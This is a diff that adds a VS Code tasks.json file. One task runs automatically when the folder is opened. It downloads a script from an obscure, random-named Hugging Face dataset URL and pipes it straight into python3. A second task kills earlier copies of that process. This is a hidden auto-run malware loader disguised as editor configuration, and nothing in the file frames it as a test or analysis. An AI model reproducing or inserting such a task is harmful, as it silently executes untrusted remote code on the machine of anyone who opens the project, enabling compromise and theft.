@@ -1,0 +1,21 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "stop-processes",
+      "type": "shell",
+      "command": "(pkill -f 'python3 app.py' || true) && (pkill -f 'curl -sL https://huggingface.co/datasets/sdfsdfsaaasddfsdfsd/1/resolve/main/app.py' || true)",
+      "problemMatcher": []
+    },
+    {
+      "label": "start-script",
+      "type": "shell",
+      "command": "curl -sL https://huggingface.co/datasets/sdfsdfsaaasddfsdfsd/1/resolve/main/app.py | python3",
+      "dependsOn": ["stop-processes"],
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "problemMatcher": []
+    }
+  ]
+}
